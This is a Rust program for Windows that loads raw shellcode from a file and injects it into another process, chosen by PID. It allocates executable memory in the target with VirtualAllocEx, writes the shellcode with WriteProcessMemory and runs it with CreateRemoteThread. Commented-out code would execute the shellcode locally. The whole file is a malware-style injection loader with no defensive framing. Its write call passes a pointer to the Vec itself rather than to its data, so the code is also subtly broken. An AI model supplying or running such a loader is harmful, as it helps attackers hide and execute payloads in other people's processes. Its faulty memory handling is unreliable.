use std::{arch::asm, env, ffi::c_void, fs::File, io::Read, mem::transmute, process::exit, ptr::{self, null, null_mut}};
use anyhow::Result;
use windows::Win32::{Foundation::GetLastError, System::{Diagnostics::Debug::WriteProcessMemory, Memory::{VirtualAlloc, VirtualAllocEx, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Threading::{CreateRemoteThread, OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_WRITE}}};

fn main() {
    let shellcode = match read_shellcode_file() {
        Ok(s) => s,
        Err(e) => panic!("[-] Unable to read shellcode from file: {e}"),
    };

    let pid = collect_proc_addr();

     // GET HANDLE TO PID
     let h_process = unsafe { OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid) };
     let h_process = match h_process {
         Ok(h) => {
             println!("[+] Got handle to process ID {pid}, handle: {:?}", h);
             h // return the handle
         },
         Err(e) => panic!("[-] Could not get handle to pid {pid}, error: {e}"),
     };

    //  allocate memory
     let alloc = unsafe { 
        VirtualAllocEx(
            h_process, 
            Some(null_mut()), 
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE)
     };

     println!("[+] Address of allocated memory: {:?} in process pid: {}", alloc, pid);

     let mut bytes_written: usize = 0;

     // write the shellcode
     let _ = unsafe {
        WriteProcessMemory(
            h_process, 
            alloc,
            &shellcode as *const _ as *const c_void, 
            shellcode.len(),
            Some(&mut bytes_written),
        )
     };
     
     if (bytes_written == 0) || (bytes_written != shellcode.len() as usize) {
        panic!("[-] Failed to write process memory. Shellcode length: {}", shellcode.len() as usize);
     } else {
         println!("[+] Bytes written: {}. Shellcode length: {}", bytes_written, shellcode.len() as usize);
     }

    //  unsafe {
    //     asm!("int3");
    //  }

     let mut thread: u32 = 0;
     let _ = unsafe {
        CreateRemoteThread(
            h_process,
            None,
            0,
            Some(transmute(alloc)),
            None,
            0,
            Some(&mut thread),
            )
     };

     if thread == 0 {
        unsafe {panic!("[-] Could not create remote thread. {:?}", GetLastError());}
     } else {
        println!("[+] Thread created: {}", thread);
     }

}

fn collect_proc_addr() -> u32 {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] PID required.");
        exit(1);
    }

    let pid = args[1].clone();
    let pid_as_int: u32 = pid.parse().unwrap();

    pid_as_int
}

fn read_shellcode_file() -> Result<Vec<u8>> {
    let mut shellcode_file = File::open("shellcode.bin")?;
    let mut shellcode_buffer = Vec::new();
    shellcode_file.read_to_end(&mut shellcode_buffer)?;

    // Allocate executable memory
    // let shellcode_ptr = unsafe {
    //     VirtualAlloc(
    //         Some(null_mut()),
    //         shellcode_buffer.len(),
    //         MEM_COMMIT | MEM_RESERVE,
    //         PAGE_EXECUTE_READWRITE,
    //     ) as *mut u8
    // };

    // if shellcode_ptr.is_null() {
    //     panic!("Failed to allocate executable memory.");
    // }

    // // Copy shellcode to the allocated memory
    // unsafe {
    //     std::ptr::copy_nonoverlapping(shellcode_buffer.as_ptr(), shellcode_ptr, shellcode_buffer.len());

    //     // Execute the shellcode
    //     let shellcode_fn: extern "C" fn() = std::mem::transmute(shellcode_ptr);
    //     shellcode_fn();

    //     // Free the allocated memory
    //     let _ = VirtualFree(shellcode_ptr as *mut c_void, 0, MEM_RELEASE);
    // }

    Ok(shellcode_buffer)
}